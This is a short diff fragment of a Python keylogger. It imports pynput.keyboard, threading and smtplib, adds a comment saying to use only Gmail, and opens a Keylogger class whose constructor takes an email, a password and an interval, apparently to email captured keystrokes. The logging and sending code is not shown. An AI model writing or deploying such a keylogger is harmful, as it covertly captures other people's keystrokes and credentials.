@@ -1,5 +1,5 @@
 import pynput.keyboard,threading,smtplib
-
+#Use only gmail
 
 class Keylogger:
     def __init__(self,email,password,interval): #(constructor method __init__)This will start when the object is created with this class
